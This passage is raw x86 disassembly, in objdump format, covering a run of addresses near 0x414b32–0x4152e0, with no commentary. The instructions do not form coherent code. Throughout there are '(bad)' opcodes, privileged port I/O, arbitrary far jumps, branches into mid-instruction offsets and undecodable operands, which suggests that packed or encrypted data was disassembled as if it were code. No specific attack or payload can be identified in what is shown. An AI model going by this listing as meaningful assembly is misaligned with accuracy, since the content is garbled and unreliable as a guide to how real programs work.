  414b32:	les    esi,FWORD PTR [eax+0x4aa8ab69]
  414b38:	jp     0x414b2c
  414b3a:	das    
  414b3b:	mov    DWORD PTR [eax+0x1ee6f4c],ecx
  414b41:	lods   al,BYTE PTR ds:[esi]
  414b42:	or     al,0x98
  414b44:	push   esp
  414b45:	in     eax,0x66
  414b47:	push   es
  414b48:	sahf   
  414b49:	sub    edx,DWORD PTR [edx-0x4c]
  414b4c:	adc    DWORD PTR [eax+0x74],edi
  414b4f:	mov    cl,0xa3
  414b51:	adc    ecx,DWORD PTR [ebx+0x60d71af6]
  414b57:	rcl    edi,1
  414b59:	mov    eax,ds:0xbb0b10f1
  414b5e:	test   eax,0xf132c50c
  414b63:	jg     0x414b22
  414b65:	jp     0x414b74
  414b67:	ja     0x414b25
  414b69:	lock jmp 0xb844:0x82341009
  414b71:	icebp  
  414b72:	in     al,0x4b
  414b74:	clc    
  414b75:	mov    bh,0xd2
  414b77:	adc    al,bh
  414b79:	scas   eax,DWORD PTR es:[edi]
  414b7a:	test   BYTE PTR [esi+0x4b0fdb53],0xff
  414b81:	or     esp,edx
  414b83:	jg     0x414b5d
  414b85:	mov    ah,0xd6
  414b87:	xchg   ebx,eax
  414b88:	xor    eax,DWORD PTR [esi+0x1a]
  414b8b:	xchg   edx,eax
  414b8c:	or     ebp,ebx
  414b8e:	jecxz  0x414b90
  414b90:	sbb    al,0x88
  414b92:	fdiv   DWORD PTR [edx]
  414b94:	mov    esi,0x75c483ef
  414b99:	jp     0x414c01
  414b9b:	mov    bl,0xc3
  414b9d:	ret    0x1962
  414ba0:	xor    ah,BYTE PTR [ecx+ecx*2+0x2ea76e30]
  414ba7:	or     DWORD PTR [edx-0xf],ebp
  414baa:	mov    bh,0x1e
  414bac:	(bad)  [edi-0x51]
  414baf:	cld    
  414bb0:	mov    ds:0x9a941d04,al
  414bb5:	ror    DWORD PTR [edi],0x57
  414bb8:	mov    gs,WORD PTR [eax+0x59]
  414bbb:	and    ecx,esp
  414bbd:	xor    bh,dh
  414bbf:	popf   
  414bc0:	retf   0xb49c
  414bc3:	jmp    0x39bfbba
  414bc8:	(bad)  
  414bc9:	fdiv   QWORD PTR [edi-0x7b4c13bf]
  414bcf:	pop    esp
  414bd0:	mov    cl,0xe8
  414bd2:	jg     0x414c46
  414bd4:	and    eax,0x76d71f4e
  414bd9:	mov    dh,0x49
  414bdb:	in     eax,0x36
  414bdd:	pop    ebx
  414bde:	xor    ebx,DWORD PTR [edx-0x61]
  414be1:	mov    ah,0x63
  414be3:	jb     0x414b6c
  414be5:	xor    esp,ecx
  414be7:	inc    ebx
  414be8:	adc    al,dl
  414bea:	push   ecx
  414beb:	enter  0xf4ff,0x52
  414bef:	cmp    ah,al
  414bf1:	mov    bl,BYTE PTR [edx+eiz*2+0x42]
  414bf5:	jmp    0x9136:0xb4b9a11e
  414bfc:	jnp    0x414b95
  414bfe:	sub    eax,0x2a648c75
  414c03:	clc    
  414c04:	sbb    eax,DWORD PTR [ebx]
  414c06:	push   ss
  414c07:	mov    cl,0x1d
  414c09:	cwde   
  414c0a:	mov    bh,0x28
  414c0c:	push   edx
  414c0d:	dec    ebp
  414c0e:	xor    eax,0xbe332d7b
  414c13:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c17:	icebp  
  414c18:	inc    esp
  414c19:	push   eax
  414c1a:	cmp    dh,BYTE PTR [ebx]
  414c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1d:	sub    edi,DWORD PTR [ebx-0x4c22fb6d]
  414c23:	and    DWORD PTR [eax-0x469fb59b],esi
  414c29:	or     ebp,DWORD PTR [esi]
  414c2b:	xor    ah,BYTE PTR [eax]
  414c2d:	sub    DWORD PTR [eax-0x11],esp
  414c30:	cdq    
  414c31:	xor    cl,BYTE PTR [ecx]
  414c33:	add    al,0xfc
  414c35:	scas   al,BYTE PTR es:[edi]
  414c36:	and    ch,BYTE PTR [ecx-0x6c978494]
  414c3c:	enter  0xbe3c,0xa9
  414c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c41:	popf   
  414c42:	mov    WORD PTR [edx+0x4b],fs
  414c45:	xchg   ecx,eax
  414c46:	xor    ah,BYTE PTR [ecx-0x36]
  414c49:	xchg   ebp,eax
  414c4a:	imul   eax,DWORD PTR [ebp+0x67],0x89b74fce
  414c51:	xlat   BYTE PTR ds:[ebx]
  414c52:	(bad)  
  414c53:	jne    0x414c2b
  414c55:	test   al,0xf1
  414c57:	add    DWORD PTR es:[edx],ebp
  414c5a:	jae    0x414c5a
  414c5c:	jb     0x414c80
  414c5e:	adc    BYTE PTR [ecx-0x5fe95d9d],bh
  414c64:	shr    BYTE PTR [eax-0x69],cl
  414c67:	shr    BYTE PTR [ecx+ebx*2],1
  414c6a:	leave  
  414c6b:	mov    ah,0x83
  414c6d:	(bad)  
  414c6e:	call   0xe7e4:0x3f198a2e
  414c75:	sub    DWORD PTR [edi-0x3f],ebp
  414c78:	stos   BYTE PTR es:[edi],al
  414c79:	ror    BYTE PTR [ebp-0x2bb9da4b],cl
  414c7f:	jge    0x414c82
  414c81:	pop    ebx
  414c82:	push   ebx
  414c83:	dec    edx
  414c84:	daa    
  414c85:	jp     0x414c69
  414c87:	lea    ecx,[ecx+0x3dd41a1d]
  414c8d:	test   DWORD PTR [eax-0x2b],ecx
  414c90:	jb     0x414c3f
  414c92:	int3   
  414c93:	int    0x32
  414c95:	mov    dh,0xc5
  414c97:	mov    esi,0xedc03d74
  414c9c:	pop    ebx
  414c9d:	les    edx,FWORD PTR [esi-0x2d]
  414ca0:	cmp    dl,bh
  414ca2:	retf   0x2851
  414ca5:	(bad)  
  414ca6:	jmp    0x168f:0x63988c69
  414cad:	or     BYTE PTR [ebp+0x12],dh
  414cb0:	mov    eax,ds:0x62525a9d
  414cb5:	fsub   QWORD PTR [edx]
  414cb7:	mov    al,0x69
  414cb9:	loopne 0x414d09
  414cbb:	movntpd XMMWORD PTR [eax-0x264b2d20],xmm2
  414cc3:	in     eax,dx
  414cc4:	ficom  DWORD PTR [eax+0x79860eda]
  414cca:	lea    esp,[esi+0x7c]
  414ccd:	nop
  414cce:	(bad)  
  414ccf:	mov    dl,0xc6
  414cd1:	mov    eax,ds:0xbe53c744
  414cd6:	(bad)
  414cd9:	outs   dx,DWORD PTR ds:[esi]
  414cda:	xchg   esp,eax
  414cdb:	lods   eax,DWORD PTR ds:[esi]
  414cdc:	jmp    FWORD PTR [ebx]
  414cde:	das    
  414cdf:	or     bl,al
  414ce1:	imul   eax,DWORD PTR [ebp+0x72375172],0xffffffc2
  414ce8:	call   0x54cc82d3
  414ced:	sub    bh,dh
  414cef:	sbb    cl,BYTE PTR [esp+edx*2-0x4c]
  414cf3:	mov    ecx,0xcb4b79a
  414cf8:	adc    al,0x57
  414cfa:	stos   BYTE PTR es:[edi],al
  414cfb:	or     dl,BYTE PTR [ebp-0x2a7e5a23]
  414d01:	rcl    BYTE PTR [edi+edx*1+0x2247223],0x41
  414d09:	mov    es,WORD PTR [ecx+0x59]
  414d0c:	stc    
  414d0d:	cmp    eax,0x3a82dbe3
  414d12:	rol    BYTE PTR [eax+0xa],cl
  414d15:	push   0x89aabdb6
  414d1a:	inc    ebp
  414d1b:	add    eax,0x275dbee6
  414d20:	add    ebx,DWORD PTR [edi]
  414d22:	mov    WORD PTR [ebx+0x53],gs
  414d25:	sbb    ebp,0x865e6f80
  414d2b:	pop    esi
  414d2c:	dec    edx
  414d2d:	ds push edi
  414d2f:	xor    BYTE PTR [ecx+ebx*4],ah
  414d32:	pop    eax
  414d33:	xor    DWORD PTR [ecx],ecx
  414d35:	jecxz  0x414d38
  414d37:	mov    dl,0x9c
  414d39:	adc    eax,0xc6a3d9ce
  414d3e:	cwde   
  414d3f:	outs   dx,DWORD PTR ds:[esi]
  414d40:	and    ah,BYTE PTR [edi+0x5c]
  414d43:	mov    ds:0xba312fc8,eax
  414d48:	dec    eax
  414d49:	int3   
  414d4a:	scas   eax,DWORD PTR es:[edi]
  414d4b:	scas   eax,DWORD PTR es:[edi]
  414d4c:	sbb    edx,DWORD PTR [ebx]
  414d4e:	sbb    ebx,eax
  414d50:	scas   eax,DWORD PTR es:[edi]
  414d51:	push   ebx
  414d52:	retf   
  414d53:	in     eax,dx
  414d54:	test   edi,esi
  414d56:	lock push ds
  414d58:	mov    ecx,0x89d388ae
  414d5d:	fisubr DWORD PTR [edi+0x57218ae4]
  414d63:	and    ch,BYTE PTR [ebx]
  414d65:	dec    eax
  414d66:	sbb    ebp,DWORD PTR [ecx-0x20afaa8f]
  414d6c:	xchg   edx,ebx
  414d6e:	or     al,0x73
  414d70:	mov    ch,0x94
  414d72:	xchg   edx,eax
  414d73:	dec    eax
  414d74:	add    al,al
  414d76:	leave  
  414d77:	(bad)  
  414d78:	dec    edi
  414d79:	daa    
  414d7a:	xchg   bx,ax
  414d7c:	inc    edx
  414d7d:	jo     0x414d92
  414d7f:	out    0x32,eax
  414d81:	cli    
  414d82:	pop    ds
  414d83:	mov    ebp,0xba2b8b17
  414d88:	mov    ch,0xa5
  414d8a:	rcl    BYTE PTR [eax+0x662108c],1
  414d90:	jg     0x414d13
  414d92:	jb     0x414d6d
  414d94:	rol    BYTE PTR [edx+0x7f],cl
  414d97:	cmp    DWORD PTR [edi+0x25],0x17
  414d9b:	push   DWORD PTR ds:[ebx-0x2a04acf9]
  414da2:	cmp    BYTE PTR es:[edx+eiz*2+0x56],cl
  414da7:	add    al,0xc0
  414da9:	fnsave [eax+0x6c]
  414dac:	xchg   ebx,eax
  414dad:	in     al,0x2c
  414daf:	mov    ?,ecx
  414db1:	aas    
  414db2:	jmp    0x414dc8
  414db4:	(bad)  
  414db5:	scas   eax,DWORD PTR es:[edi]
  414db6:	add    BYTE PTR [ebx-0x5c],ch
  414db9:	mov    ch,0x76
  414dbb:	push   ebx
  414dbc:	dec    eax
  414dbd:	int3   
  414dbe:	mov    BYTE PTR [edi],ah
  414dc0:	aas    
  414dc1:	retf   
  414dc2:	jbe    0x414dce
  414dc4:	lea    esp,[esi+0x37003dbc]
  414dca:	sahf   
  414dcb:	into   
  414dcc:	ins    BYTE PTR es:[edi],dx
  414dcd:	cwde   
  414dce:	ja     0x414e36
  414dd0:	clc    
  414dd1:	shr    BYTE PTR [ecx],cl
  414dd3:	das    
  414dd4:	mov    ah,al
  414dd6:	jecxz  0x414e23
  414dd8:	cld    
  414dd9:	or     bh,BYTE PTR [esi]
  414ddb:	xor    dh,BYTE PTR [edi-0x33d86e7]
  414de1:	repnz loope 0x414e1a
  414de4:	lock cli 
  414de6:	add    eax,edx
  414de8:	cmp    BYTE PTR [esi+0x79],0xe2
  414dec:	push   esp
  414ded:	stos   DWORD PTR es:[edi],eax
  414dee:	sahf   
  414def:	stos   BYTE PTR es:[edi],al
  414df0:	add    bh,ch
  414df2:	or     ebp,DWORD PTR [esi+0x40085ed]
  414df8:	cmp    al,0xa7
  414dfa:	sbb    eax,DWORD PTR [edx-0x64b3368e]
  414e00:	adc    DWORD PTR [edi+0x39267de7],eax
  414e06:	push   ebp
  414e07:	mov    dh,0x53
  414e09:	mov    ecx,0x757138dd
  414e0e:	es push ebp
  414e10:	push   ebx
  414e11:	loope  0x414de9
  414e13:	jbe    0x414def
  414e15:	loop   0x414e55
  414e17:	cld    
  414e18:	and    BYTE PTR [esi+0x7d],0x7f
  414e1c:	bound  esp,QWORD PTR [esi-0x7]
  414e1f:	dec    esp
  414e20:	pop    ss
  414e21:	call   0x78d985eb
  414e26:	sbb    DWORD PTR ds:0xaf6808fe,0xffffffcc
  414e2d:	iret   
  414e2e:	cld    
  414e2f:	sbb    bh,dl
  414e31:	mov    edi,0x2bc04d10
  414e36:	pusha  
  414e37:	or     DWORD PTR ds:0xc95612e2,0x46
  414e3e:	hlt    
  414e3f:	(bad)  
  414e40:	and    BYTE PTR ds:0x8f4c3f1c,ah
  414e46:	fcom   QWORD PTR [eax+0x6389126f]
  414e4c:	cli    
  414e4d:	aas    
  414e4e:	addr16 repnz xchg ebx,eax
  414e51:	data16 mov bl,0x66
  414e54:	retf   0xbd83
  414e57:	add    bl,dl
  414e59:	test   esp,ebx
  414e5b:	mov    bh,0xe4
  414e5d:	mov    edx,0xba8bf1ad
  414e62:	mov    edx,0xa7b2be5d
  414e67:	es into 
  414e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e6a:	push   ebx
  414e6b:	push   ecx
  414e6c:	retf   
  414e6d:	sbb    al,0xf
  414e6f:	cmp    ah,bl
  414e71:	les    esp,FWORD PTR ds:0xe01a9467
  414e77:	add    ecx,DWORD PTR [edi]
  414e79:	cdq    
  414e7a:	push   ds
  414e7b:	aas    
  414e7c:	mov    al,0x7d
  414e7e:	in     al,dx
  414e7f:	div    DWORD PTR [edx+0x76]
  414e82:	stc    
  414e83:	mov    ch,0x67
  414e85:	shl    dl,0x6b
  414e88:	imul   ebx,DWORD PTR [eax+0x3c],0x2c2a807c
  414e8f:	adc    eax,0x5038a471
  414e94:	push   ebp
  414e95:	lods   al,BYTE PTR ds:[esi]
  414e96:	das    
  414e97:	(bad)  
  414e98:	int3   
  414e99:	sub    dl,BYTE PTR [ecx]
  414e9b:	mov    ah,0x76
  414e9d:	bound  edi,QWORD PTR [edx-0x57bd6bff]
  414ea3:	mov    cl,BYTE PTR [ebx]
  414ea5:	inc    ebx
  414ea6:	popa   
  414ea7:	jb     0x414e32
  414ea9:	imul   esi,DWORD PTR [edx],0x31
  414eac:	enter  0x879f,0xdd
  414eb0:	retf   0x2147
  414eb3:	fild   DWORD PTR [eax+0x7448d9d5]
  414eb9:	push   edi
  414eba:	pop    edi
  414ebb:	es pop ebx
  414ebd:	test   BYTE PTR [edx-0x1b],dl
  414ec0:	test   al,0x98
  414ec2:	in     al,0x17
  414ec4:	push   0x9a5914f
  414ec9:	int    0xbe
  414ecb:	sbb    ah,BYTE PTR [eax]
  414ecd:	in     al,dx
  414ece:	add    al,0x6b
  414ed0:	inc    esi
  414ed1:	dec    edx
  414ed2:	daa    
  414ed3:	mov    DWORD PTR [eax-0x75904f1e],ebx
  414ed9:	push   edi
  414eda:	dec    edx
  414edb:	mov    ecx,0x1032aba1
  414ee0:	jo     0x414f04
  414ee2:	aad    0x9d
  414ee4:	push   cs
  414ee5:	(bad)  
  414ee6:	mov    edi,0xc4feb115
  414eeb:	or     DWORD PTR [edi+0x54cf8c5b],edx
  414ef1:	cli    
  414ef2:	xchg   edx,eax
  414ef3:	retf   0x7401
  414ef6:	fwait
  414ef7:	xor    al,0xeb
  414ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414efa:	inc    ebp
  414efb:	js     0x414e7d
  414efd:	push   DWORD PTR [edx]
  414eff:	add    cl,BYTE PTR cs:[ecx]
  414f02:	dec    esi
  414f03:	sub    al,0xf1
  414f05:	xchg   edx,eax
  414f06:	mov    cl,0x8d
  414f08:	mov    cs,WORD PTR [eax+0x19]
  414f0b:	xchg   edi,eax
  414f0c:	xor    edi,0xde38edb2
  414f12:	push   0x7a299f59
  414f17:	cmp    BYTE PTR [ecx-0x6e],bh
  414f1a:	arpl   dx,ax
  414f1c:	repz mov esp,0x31c506a6
  414f22:	jle    0x414efb
  414f24:	cmp    bl,BYTE PTR [ebp-0x5e]
  414f27:	mov    eax,0xcad7c6cc
  414f2c:	(bad)  
  414f2d:	aad    0x3d
  414f2f:	mov    ds:0xea615e71,al
  414f34:	mov    esp,ecx
  414f36:	cmp    BYTE PTR [edi+0x3e03b38],dh
  414f3c:	ficomp WORD PTR [ecx+0x178f145a]
  414f42:	inc    ecx
  414f43:	in     al,0xa4
  414f45:	add    eax,0x11d40b28
  414f4a:	cmp    BYTE PTR [edx+0x7],al
  414f4d:	jae    0x414f34
  414f4f:	fisub  WORD PTR [edi-0x76]
  414f52:	inc    edx
  414f53:	cmp    al,0x4c
  414f55:	pop    ebx
  414f56:	push   ds
  414f57:	ret    0x88c3
  414f5a:	std    
  414f5b:	push   esp
  414f5c:	fmul   st(1),st
  414f5e:	adc    ch,dl
  414f60:	xor    BYTE PTR [ebp-0x57ff76af],ch
  414f66:	aaa    
  414f67:	outs   dx,DWORD PTR ds:[esi]
  414f68:	ja     0x414f84
  414f6a:	cmp    edi,edi
  414f6c:	mov    ebx,0x32a79afa
  414f71:	mov    esp,0x7a024736
  414f76:	aaa    
  414f77:	(bad)  
  414f79:	pusha  
  414f7a:	sbb    al,0xf5
  414f7c:	pop    ebx
  414f7d:	mov    BYTE PTR [ebx-0x3e19c03d],bl
  414f83:	dec    esi
  414f84:	push   ebx
  414f85:	outs   dx,BYTE PTR ds:[si]
  414f87:	retf   0x390d
  414f8a:	jmp    0xd01:0x3fdb61d1
  414f91:	push   esp
  414f92:	xchg   BYTE PTR [esi+0x44376760],dh
  414f98:	shl    BYTE PTR [esi],1
  414f9a:	rcl    BYTE PTR [edx],cl
  414f9c:	push   ebp
  414f9d:	sub    esp,edx
  414f9f:	add    eax,0x6ad0f6f5
  414fa4:	retf   0xfa4b
  414fa7:	mov    ecx,0x5e968327
  414fac:	icebp  
  414fad:	sub    al,0xad
  414faf:	adc    ah,al
  414fb1:	mov    bh,0x53
  414fb3:	fwait
  414fb4:	jge    0x414f61
  414fb6:	or     DWORD PTR [edx+0x79],esp
  414fb9:	push   ecx
  414fba:	jae    0x415007
  414fbc:	or     ebx,ebp
  414fbe:	cmp    edx,esp
  414fc0:	mov    ds:0xe20f4964,eax
  414fc5:	arpl   WORD PTR [eax-0x6bcb20c6],sp
  414fcb:	(bad)  
  414fcc:	in     eax,dx
  414fcd:	cs ret 
  414fcf:	std    
  414fd0:	push   ecx
  414fd1:	cmp    al,0x1b
  414fd3:	or     al,0x4e
  414fd5:	mov    ecx,0xf6fd00e2
  414fda:	dec    ecx
  414fdb:	int    0xbe
  414fdd:	push   edx
  414fde:	shr    DWORD PTR [ebx+0x65e1c96c],cl
  414fe4:	mov    ecx,0x442f8f76
  414fe9:	xchg   edx,eax
  414fea:	inc    esp
  414feb:	lods   eax,DWORD PTR ds:[esi]
  414fec:	dec    ebp
  414fed:	lahf   
  414fee:	popa   
  414fef:	xor    eax,0xa6714449
  414ff4:	or     ebp,ecx
  414ff6:	addr16 jb 0x414fd4
  414ff9:	xchg   dh,dh
  414ffb:	call   0x2e1a:0x26896f3
  415002:	push   cs
  415003:	imul   edi,DWORD PTR [edi],0xffffff8c
  415006:	push   edx
  415007:	mov    cl,BYTE PTR [ecx+0x62509fba]
  41500d:	pop    edx
  41500e:	hlt    
  41500f:	xchg   ecx,eax
  415010:	ja     0x41500d
  415012:	mov    ah,0x2e
  415014:	repnz es dec edx
  415017:	leave  
  415018:	xchg   bh,al
  41501a:	aad    0x61
  41501c:	push   0xdda813d3
  415021:	adc    DWORD PTR [edi-0xf5b9dd8],ebx
  415027:	mov    eax,ds:0x48ad4db6
  41502c:	mov    WORD PTR [edx],cs
  41502e:	or     al,0x3c
  415030:	xor    eax,0x4ff5948b
  415035:	mov    cl,BYTE PTR [edx-0x41]
  415038:	adc    al,0x2b
  41503a:	or     bl,BYTE PTR [esp+eax*4+0x61]
  41503e:	daa    
  41503f:	adc    DWORD PTR [ecx+0x9972e80],edi
  415045:	cwde   
  415046:	into   
  415047:	xchg   esp,eax
  415048:	mov    ds:0x22ce4136,al
  41504d:	jo     0x415028
  41504f:	push   0x61e71109
  415054:	sub    DWORD PTR [esi],esp
  415056:	stos   BYTE PTR es:[edi],al
  415057:	xchg   edx,eax
  415058:	pop    ebp
  415059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41505a:	and    esp,DWORD PTR [ebx+0x5c]
  41505d:	cs mov edx,0x25d94d7d
  415063:	or     al,0xfe
  415065:	push   ds
  415066:	pop    ebx
  415067:	fsub   st(6),st
  415069:	aad    0x14
  41506b:	stc    
  41506c:	mov    ds:0x1379846c,eax
  415071:	rcr    BYTE PTR ds:0x9ffeb49b,cl
  415077:	popa   
  415078:	and    BYTE PTR [esi],bh
  41507a:	jbe    0x4150be
  41507c:	lock push ds
  41507e:	cmp    cl,BYTE PTR [ebx+0x2cda41c7]
  415084:	dec    ecx
  415085:	mov    esi,DWORD PTR [ecx-0x77800e42]
  41508b:	loope  0x415028
  41508d:	push   eax
  41508e:	jg     0x4150f7
  415090:	cmp    al,0x52
  415092:	push   ss
  415093:	jnp    0x415091
  415095:	jmp    0x9459bfae
  41509a:	dec    ecx
  41509b:	fwait
  41509c:	or     eax,0x554e9a96
  4150a1:	sbb    al,0xde
  4150a3:	ret    
  4150a4:	pop    ds
  4150a5:	inc    edi
  4150a6:	push   0x16
  4150a8:	jp     0x4150f7
  4150aa:	outs   dx,DWORD PTR ds:[esi]
  4150ab:	aas    
  4150ac:	mov    bh,0x49
  4150ae:	iret   
  4150af:	or     al,0xfc
  4150b1:	jle    0x415112
  4150b3:	add    al,0x6
  4150b5:	jae    0x415109
  4150b7:	jb     0x4150f5
  4150b9:	pop    ebx
  4150ba:	int3   
  4150bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150bc:	pop    ebp
  4150bd:	cmp    DWORD PTR [edi+0x1a802eb5],eax
  4150c3:	iret   
  4150c4:	mov    bl,0x84
  4150c6:	imul   ecx,DWORD PTR [ebx+0x54674e3b],0x40
  4150cd:	and    al,0x4d
  4150cf:	aaa    
  4150d0:	mov    esp,0xb3ede53a
  4150d5:	push   edi
  4150d6:	ja     0x415133
  4150d8:	sub    eax,0xbdacafcc
  4150dd:	xchg   bh,dl
  4150df:	aad    0x1a
  4150e1:	dec    ebp
  4150e2:	pop    edi
  4150e3:	dec    ebx
  4150e4:	cmp    eax,0xd7a7b874
  4150e9:	arpl   WORD PTR [eax-0x54],bx
  4150ec:	in     al,0xaa
  4150ee:	scas   al,BYTE PTR es:[edi]
  4150ef:	add    ecx,DWORD PTR [ecx+0x10]
  4150f2:	mov    bl,0x7e
  4150f4:	out    dx,al
  4150f5:	dec    ebx
  4150f6:	out    0x83,al
  4150f8:	dec    esp
  4150f9:	and    eax,0xaf31144c
  4150fe:	xor    ecx,edi
  415100:	(bad)  
  415101:	(bad)  
  415103:	repz xchg ecx,eax
  415105:	add    al,0x6a
  415107:	xor    ah,BYTE PTR [edx-0x10]
  41510a:	test   eax,0xe691029f
  41510f:	pop    eax
  415110:	push   ss
  415111:	(bad)  
  415112:	xor    eax,0x26428542
  415117:	dec    esp
  415118:	sub    BYTE PTR cs:[ecx+eax*8],al
  41511c:	mov    bl,0x61
  41511e:	mov    eax,ds:0x8c2eda6b
  415123:	lods   al,BYTE PTR ds:[esi]
  415124:	test   DWORD PTR [edi-0x6],ebx
  415127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415128:	neg    BYTE PTR [ecx-0x4d630342]
  41512e:	adc    edx,DWORD PTR [ebx-0x4b6e1b17]
  415134:	mov    ebp,0x53e06603
  415139:	cmp    eax,0xec797a94
  41513e:	loope  0x415105
  415140:	fldenv [ecx+0x7]
  415143:	mov    al,ds:0xcb16f896
  415148:	fcom   QWORD PTR [eax]
  41514a:	outs   dx,DWORD PTR ds:[esi]
  41514b:	cdq    
  41514c:	jecxz  0x415113
  41514e:	dec    ebx
  41514f:	xor    al,0x1
  415151:	mov    al,ds:0x4778cc9e
  415156:	cs dec esi
  415158:	out    dx,al
  415159:	pop    ss
  41515a:	dec    ecx
  41515b:	dec    ebp
  41515c:	sar    eax,cl
  41515e:	inc    eax
  41515f:	cmp    eax,0x1b5d055
  415164:	push   es
  415165:	jbe    0x41513c
  415167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415168:	xchg   DWORD PTR [edx-0x24],esi
  41516b:	(bad)  
  41516c:	mov    ?,WORD PTR [esi-0x79]
  41516f:	dec    edi
  415170:	lods   eax,DWORD PTR ds:[esi]
  415171:	sub    BYTE PTR ds:0x72df,al
  415176:	adc    al,0xe
  415178:	inc    ebp
  415179:	cmc    
  41517a:	mov    ebx,DWORD PTR [eax]
  41517c:	or     al,0x2d
  41517e:	dec    esp
  41517f:	jb     0x415150
  415181:	xchg   ecx,eax
  415182:	shl    BYTE PTR [edi],1
  415184:	jns    0x4151c6
  415186:	aad    0x7c
  415188:	cvttps2pi mm5,QWORD PTR [eax+0x61]
  41518c:	jmp    0xd48e:0x10c10c7
  415193:	push   ebp
  415194:	mov    gs,WORD PTR [edi-0x10]
  415197:	mov    edx,0x2de521
  41519c:	mov    eax,ds:0x4f1cda76
  4151a1:	pushf  
  4151a2:	scas   eax,DWORD PTR es:[edi]
  4151a3:	jle    0x4151a3
  4151a5:	mov    edx,0xd698b255
  4151aa:	jg     0x4151ac
  4151ac:	sbb    ah,BYTE PTR [ecx]
  4151ae:	and    dh,BYTE PTR [ebx+0x55]
  4151b1:	jnp    0x415211
  4151b3:	jne    0x415140
  4151b5:	rcr    DWORD PTR [edx+0x7831800d],0xb3
  4151bc:	push   cs
  4151bd:	xor    al,0x14
  4151bf:	adc    ch,bh
  4151c1:	in     eax,0xa7
  4151c3:	gs xchg bl,al
  4151c6:	pop    esp
  4151c7:	sub    bl,ah
  4151c9:	jge    0x4151cd
  4151cb:	add    edi,DWORD PTR [edi+0x75569989]
  4151d1:	mov    eax,ds:0xb41fb1e8
  4151d6:	(bad)  
  4151d7:	dec    esi
  4151d8:	xchg   ecx,eax
  4151d9:	push   eax
  4151da:	data16 loope 0x41518b
  4151dd:	mov    al,ds:0x7a33ba4b
  4151e2:	push   0xffffff81
  4151e4:	je     0x4151e5
  4151e6:	in     al,0x6a
  4151e8:	or     BYTE PTR [edx],ch
  4151ea:	and    eax,0xb6c78d5
  4151ef:	aad    0xc6
  4151f1:	jmp    0x8678ce07
  4151f6:	enter  0x524e,0x6e
  4151fa:	or     BYTE PTR [edi-0x55],ah
  4151fd:	mov    ah,0x23
  4151ff:	fidivr WORD PTR [esi]
  415201:	xchg   edx,eax
  415202:	and    al,0x7c
  415204:	fdiv   QWORD PTR [edx-0x5200a1c0]
  41520a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41520b:	or     esi,ebp
  41520d:	pop    ds
  41520e:	(bad)  
  41520f:	jno    0x415268
  415211:	sub    al,0xb1
  415213:	adc    al,0x5b
  415215:	pusha  
  415216:	scas   eax,DWORD PTR es:[edi]
  415217:	cmc    
  415218:	std    
  415219:	and    esp,DWORD PTR [edi]
  41521b:	mov    al,ds:0xaca8242f
  415220:	inc    eax
  415221:	dec    ecx
  415222:	adc    DWORD PTR [ecx],edi
  415224:	loop   0x41526a
  415226:	lock popa 
  415228:	mov    cs,WORD PTR [edi*2+0x303572b1]
  41522f:	fldcw  WORD PTR [edi]
  415231:	mov    cl,0xfc
  415233:	cmp    eax,0xc1b1e528
  415238:	inc    edx
  415239:	xor    DWORD PTR [ebx+0x7f],edi
  41523c:	mov    esi,0xdd2fe42d
  415241:	inc    DWORD PTR [eax]
  415243:	or     dl,BYTE PTR [esi]
  415245:	push   eax
  415246:	lock jae 0x41524e
  415249:	jbe    0x41528a
  41524b:	inc    ebp
  41524c:	scas   al,BYTE PTR es:[edi]
  41524d:	push   esp
  41524e:	retw   0x294e
  415252:	sub    ecx,DWORD PTR [ebp+0x519eb460]
  415258:	cld    
  415259:	and    eax,ebx
  41525b:	pop    es
  41525c:	and    al,0x25
  41525e:	hlt    
  41525f:	(bad)  
  415260:	(bad)  [edx]
  415262:	adc    al,dl
  415264:	mov    DWORD PTR [edx-0x18],edi
  415267:	dec    esi
  415268:	or     al,0x22
  41526a:	ds inc ebx
  41526c:	repnz mov gs,WORD PTR [esi]
  41526f:	mov    ?,WORD PTR [eax-0x7d]
  415272:	xor    eax,DWORD PTR [edi+0x60]
  415275:	popa   
  415276:	clc    
  415277:	lock fmul DWORD PTR [ebx-0x5fe94b08]
  41527e:	enter  0xe7ca,0x1b
  415282:	(bad)  
  415283:	stos   BYTE PTR es:[edi],al
  415284:	or     BYTE PTR [ebp-0x4b75bcb],0xcd
  41528b:	xchg   esp,eax
  41528c:	dec    ebp
  41528d:	outs   dx,DWORD PTR ds:[esi]
  41528e:	sbb    ebx,edi
  415290:	cmp    dl,ch
  415292:	jecxz  0x41523e
  415294:	idiv   BYTE PTR [edx]
  415296:	or     DWORD PTR [edi-0x480e3df0],ebx
  41529c:	push   edx
  41529d:	ins    BYTE PTR es:[edi],dx
  41529e:	dec    edx
  41529f:	in     al,dx
  4152a0:	sbb    al,0xa7
  4152a2:	daa    
  4152a3:	int3   
  4152a4:	add    DWORD PTR [edx+eiz*2-0x149062c9],eax
  4152ab:	xchg   BYTE PTR [edx],al
  4152ad:	jp     0x4152f7
  4152af:	loopne 0x41532a
  4152b1:	ss pop ecx
  4152b3:	hlt    
  4152b4:	sub    cl,BYTE PTR [ebx-0x3c]
  4152b7:	push   cs
  4152b8:	pop    ds
  4152b9:	lods   al,BYTE PTR ds:[esi]
  4152ba:	cmp    eax,0xcfae9005
  4152bf:	cmp    DWORD PTR [eax+0x54],ebx
  4152c2:	in     eax,dx
  4152c3:	mov    ecx,0x16bdb49f
  4152c8:	jb     0x41531b
  4152ca:	les    esp,FWORD PTR [eax+0x460a23bb]
  4152d0:	aaa    
  4152d1:	dec    ebx
  4152d2:	xlat   BYTE PTR ds:[ebx]
  4152d3:	push   0x55
  4152d5:	pusha  
  4152d6:	in     eax,dx
  4152d7:	fsubr  QWORD PTR [ebx+0x24]
  4152da:	mov    cs,WORD PTR [edi]
  4152dc:	daa    
  4152dd:	inc    ecx
  4152de:	ds pop edi
  4152e0:	mov    al,0x9c
